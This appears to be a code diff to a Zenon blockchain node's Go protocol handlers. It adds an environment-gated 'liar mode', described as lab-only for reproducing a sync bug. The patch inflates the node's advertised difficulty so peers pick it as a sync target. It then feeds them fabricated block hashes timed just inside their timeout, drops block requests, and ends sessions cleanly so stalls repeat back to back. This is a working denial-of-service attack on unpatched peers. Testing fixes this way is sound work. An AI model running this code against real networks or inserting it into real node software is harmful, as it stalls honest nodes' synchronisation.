@@ -1,0 +1,156 @@
+diff --git a/protocol/handler.go b/protocol/handler.go
+index 1e41621..abbbb70 100644
+--- a/protocol/handler.go
++++ b/protocol/handler.go
+@@ -20,6 +20,7 @@ import (
+ 	"errors"
+ 	"fmt"
+ 	"math"
++	"os"
+ 	"sync"
+ 	"time"
+ 
+@@ -455,6 +456,18 @@ func (pm *ProtocolManager) handleMsg(p *peer) error {
+ 		if request.Amount > uint64(downloader.MaxHashFetch) {
+ 			request.Amount = uint64(downloader.MaxHashFetch)
+ 		}
++		// LAB-ONLY drip mode (phase 29 v2): answer every hash request with a
++		// single fixed unknown hash. The requester's download session then walks
++		// the ancestor search one request at a time and stays open without
++		// importing anything — the discriminating shape from issue #291 and the
++		// fix's own scripted-origin test. Enabled by ZNN_LIAR=2; never production.
++		if os.Getenv("ZNN_LIAR") == "2" {
++			var bogus types.Hash // fixed 0xab.. fill: unknown on any chain
++			for i := range bogus {
++				bogus[i] = 0xab
++			}
++			return p.SendBlockHashes([]types.Hash{bogus})
++		}
+ 		// One unit for the request plus one per hash the walk may visit,
+ 		// admitted before the chain is touched.
+ 		budget := p.requestBudget()
+@@ -486,6 +499,57 @@ func (pm *ProtocolManager) handleMsg(p *peer) error {
+ 		if request.Amount > uint64(downloader.MaxHashFetch) {
+ 			request.Amount = uint64(downloader.MaxHashFetch)
+ 		}
++		// LAB-ONLY drip mode (phase 29 v2/v3): answer number-anchored hash
++		// requests with fresh unknown hashes — one per requested slot, each
++		// derived from the requested height, so every reply inserts into the
++		// victim's download queue and the block phase stalls behind heads that
++		// are never served (issue #291's shape; the fix's own scripted-origin
++		// test). Amount==1 replies are the binary-search cross-checks. Enabled
++		// by ZNN_LIAR=2; never production.
++		if os.Getenv("ZNN_LIAR") == "2" {
++			if request.Amount <= 1 {
++				// Ancestor-search cross-check rounds: one fresh unknown hash per
++				// reply, delayed just inside the requester's 5 s hash TTL, so the
++				// ~11-round binary search takes ~45 s and the download session
++				// (which imports nothing) stays open that long.
++				time.Sleep(4 * time.Second)
++				var h types.Hash
++				for j := range h {
++					h[j] = 0xab
++				}
++				for k := uint64(0); k < 8; k++ {
++					h[24+k] = byte(request.Number >> (8 * (7 - k)))
++				}
++				return p.SendBlockHashes([]types.Hash{h})
++			}
++			if request.Number > 512 {
++				// Phase-1 head fetch near the peer's head: a window of fresh
++				// unknown hashes — no common ancestor is found, so the session
++				// moves into the (slow) binary search above.
++				n := uint64(request.Amount)
++				if n == 0 || n > 512 {
++					n = 512
++				}
++				hashes := make([]types.Hash, 0, n)
++				for i := uint64(0); i < n; i++ {
++					var h types.Hash
++					for j := range h {
++						h[j] = 0xab
++					}
++					for k := uint64(0); k < 8; k++ {
++						h[24+k] = byte((request.Number + i) >> (8 * (7 - k)))
++					}
++					hashes = append(hashes, h)
++				}
++				return p.SendBlockHashes(hashes)
++			}
++			// Fetch-phase rounds after the ancestor search: an empty reply ends
++			// the hash phase cleanly ("no available hashes" -> Synchronization
++			// completed), so the peer is NOT dropped and the syncer starts the
++			// next ~45 s session back to back — a near-continuous hold against a
++			// pre-fix binary.
++			return p.SendBlockHashes(nil)
++		}
+ 		// One unit for the request and one for the height lookup; the walk
+ 		// is charged once its length is known, before it runs.
+ 		budget := p.requestBudget()
+@@ -544,6 +608,13 @@ func (pm *ProtocolManager) handleMsg(p *peer) error {
+ 		}
+ 
+ 	case GetBlocksMsg:
++		// LAB-ONLY liar mode (phase 29 devnet): swallow every block request
++		// without replying, so a download session against this peer stalls
++		// with a request in flight and imports nothing. Enabled by the
++		// ZNN_LIAR env var; never set in production.
++		if os.Getenv("ZNN_LIAR") != "" {
++			return nil
++		}
+ 		// Decode the retrieval message
+ 		msgStream := rlp.NewStream(msg.Payload, uint64(msg.Size))
+ 		if _, err := msgStream.List(); err != nil {
+diff --git a/protocol/peer.go b/protocol/peer.go
+index 1443696..a70e03b 100644
+--- a/protocol/peer.go
++++ b/protocol/peer.go
+@@ -19,6 +19,7 @@ package protocol
+ import (
+ 	"errors"
+ 	"fmt"
++	"os"
+ 	"sync"
+ 
+ 	lru "github.com/hashicorp/golang-lru"
+@@ -263,6 +264,12 @@ func (p *peer) RequestBlocks(hashes []types.Hash) error {
+ // Handshake executes the eth protocol handshake, negotiating version number,
+ // network IDs, difficulties, head and genesis blocks.
+ func (p *peer) Handshake(td uint64, head types.Hash, genesis types.Hash) error {
++	// LAB-ONLY liar mode (phase 29 devnet): inflate the advertised total
++	// difficulty so peers prefer this node as a sync target, while the
++	// handlers serve no hashes (ZNN_LIAR). Never set in production.
++	if os.Getenv("ZNN_LIAR") != "" {
++		td *= 1000000
++	}
+ 	// Send out own handshake in a new thread
+ 	errc := make(chan error, 1)
+ 	go func() {
+diff --git a/protocol/sync.go b/protocol/sync.go
+index 8284e3e..b0a4b45 100644
+--- a/protocol/sync.go
++++ b/protocol/sync.go
+@@ -18,6 +18,7 @@ package protocol
+ 
+ import (
+ 	"math/rand"
++	"os"
+ 	"time"
+ 
+ 	"github.com/zenon-network/go-zenon/chain/nom"
+@@ -118,6 +119,15 @@ func (pm *ProtocolManager) txsyncLoop() {
+ // syncer is responsible for periodically synchronising with the network, both
+ // downloading hashes and blocks as well as handling the announcement handler.
+ func (pm *ProtocolManager) syncer() {
++	// LAB-ONLY liar mode (phase 29 devnet): never start a download session
++	// as a client, so the node keeps its own chain view. Enabled by the
++	// ZNN_LIAR env var; never set in production.
++	if os.Getenv("ZNN_LIAR") != "" {
++		select {
++		case <-pm.quitSync:
++			return
++		}
++	}
+ 	// Start and ensure cleanup of sync mechanisms
+ 	pm.fetcher.Start()
+ 	defer pm.fetcher.Stop()
